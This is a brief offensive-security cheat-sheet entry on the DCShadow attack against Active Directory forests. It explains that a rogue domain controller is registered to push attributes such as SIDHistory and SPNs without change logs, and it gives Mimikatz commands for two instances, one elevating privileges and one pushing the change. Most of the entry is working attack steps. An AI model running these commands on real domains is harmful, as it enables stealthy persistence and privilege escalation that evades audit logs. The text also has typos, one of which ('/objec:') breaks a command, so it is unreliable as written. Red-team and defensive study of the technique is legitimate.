# Forest Attacks - Cross Forest Attacks
DCShaodw temporarliy registers a new domain controller in the domain and uses it to push attributes like SIDHistory , SPNs and etc without leaving change logs for objects.

New domain controller is registered by modifying configuration , SPNs of existing computer object and couple of RPC services


## Mimikatz

We need two instances of mimikatz for `DCShadow`

```
!+
!processtoken
lsadump::dcshadow /objec:rootuser /attribute:Description /value="Hello from DCShadow"
```

And the second instance with domain admin privileges 

```
lsadump::dcshadow /push
```
